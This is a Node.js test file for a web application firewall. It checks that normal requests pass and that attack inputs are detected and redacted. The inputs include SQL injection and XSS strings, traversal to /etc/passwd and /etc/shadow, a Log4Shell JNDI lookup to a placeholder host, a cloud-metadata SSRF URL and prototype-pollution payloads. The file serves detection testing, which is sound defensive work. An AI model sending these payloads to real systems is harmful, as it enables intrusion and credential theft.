'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { Waf } = require('../waf.cjs');

const waf = new Waf(require('../waf-rules.json'), { paranoia: 2 });
const ids = result => result.events.map(event => event.rule.id);

test('carrega o conjunto inteiro de regras', () => {
  assert.ok(waf.rules.length >= 150, `regras: ${waf.rules.length}`);
  assert.ok(waf.rulesVersion.startsWith('crs-'));
});

test('tráfego comum não casa', () => {
  const result = waf.createContext().run({ persistent: {
    'server.request.headers.no_cookies': { 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64)', accept: 'application/json', host: 'app.example.com' },
    'server.request.query': { page: ['2'], q: ['monitoramento de redes'] },
    'server.request.uri.raw': '/api/hosts?page=2&q=monitoramento+de+redes',
    'server.request.method': 'GET',
    'server.request.body': { name: 'João da Silva', note: 'Troca de equipamento na sexta-feira' },
  } }, 200000);
  assert.deepEqual(ids(result), []);
  assert.equal(result.timeout, false);
});

test('SQLi e XSS passam pelo libinjection', () => {
  const sqli = waf.createContext().run({ persistent: { 'server.request.query': { q: ["1' OR '1'='1"] } } }, 200000);
  assert.ok(ids(sqli).includes('crs-942100'), ids(sqli).join());
  const xss = waf.createContext().run({ persistent: { 'server.request.query': { q: ['<script>alert(1)</script>'] } } }, 200000);
  assert.ok(ids(xss).includes('crs-941100'), ids(xss).join());
});

test('o evento não carrega o valor recebido', () => {
  const result = waf.createContext().run({ persistent: { 'server.request.query': { q: ['../../etc/passwd'] } } }, 200000);
  assert.ok(result.events.length > 0);
  assert.ok(!JSON.stringify(result.events).includes('passwd'));
});

test('prevenção de exploit compara a operação com a entrada', () => {
  const context = waf.createContext();
  context.run({ persistent: { 'server.request.query': { file: ['../../etc/shadow'] } } }, 200000);
  assert.deepEqual(ids(context.run({ ephemeral: { 'server.io.fs.file': '/srv/app/uploads/../../etc/shadow' } }, 200000)), ['rasp-930-100']);
  assert.deepEqual(ids(context.run({ ephemeral: { 'server.io.fs.file': '/srv/app/uploads/photo.png' } }, 200000)), []);
  const sql = waf.createContext();
  sql.run({ persistent: { 'server.request.query': { id: ["1' OR '1'='1"] } } }, 200000);
  assert.ok(ids(sql.run({ ephemeral: { 'server.db.statement': "SELECT * FROM t WHERE id = '1' OR '1'='1'", 'server.db.system': 'mysql' } }, 200000)).includes('rasp-942-100'));
});

test('regras próprias: Log4Shell, SSRF a metadados e poluição de protótipo', () => {
  const run = persistent => ids(waf.createContext().run({ persistent }, 500000));
  assert.ok(run({ 'server.request.headers.no_cookies': { 'x-api': '${jndi:ldap://x.example/a}' } }).includes('tlv-000-111'));
  assert.ok(run({ 'server.request.query': { u: ['http://169.254.169.254/latest/meta-data/'] } }).includes('tlv-000-101'));
  assert.ok(run({ 'server.request.body': JSON.parse('{"__proto__":{"admin":true}}') }).includes('tlv-000-004'));
  assert.ok(run({ 'server.request.query': { 'a[constructor][prototype][x]': ['1'] } }).includes('tlv-000-005'));
});

test('varredura só dispara quando a resposta é 404', () => {
  const miss = waf.createContext();
  miss.run({ persistent: { 'server.request.path': '/.env' } }, 200000);
  assert.ok(ids(miss.run({ persistent: { 'server.response.status': '404' } }, 200000)).includes('tlv-000-206'));
  const hit = waf.createContext();
  hit.run({ persistent: { 'server.request.path': '/.env' } }, 200000);
  assert.deepEqual(ids(hit.run({ persistent: { 'server.response.status': '200' } }, 200000)), []);
});

test('esquema da API marca campos sensíveis sem valores', () => {
  const result = waf.createContext().run({ persistent: {
    'server.request.body': { email: 'ana@example.com', password: 'x', age: 31, tags: ['a', 'b'], card: '4111111111111111' },
    'waf.context.processor': { 'extract-schema': true },
  } }, 200000);
  const json = JSON.stringify(result.derivatives);
  assert.ok(json.includes('"pii"') && json.includes('credentials') && json.includes('"card"'), json);
  assert.ok(!json.includes('ana@example.com') && !json.includes('4111111111111111'), json);
});

test('estouro de tempo devolve timeout, não resultado limpo', () => {
  const result = waf.createContext().run({ persistent: { 'server.request.query': { q: ['a'.repeat(4000)] } } }, 1);
  assert.equal(result.timeout, true);
});
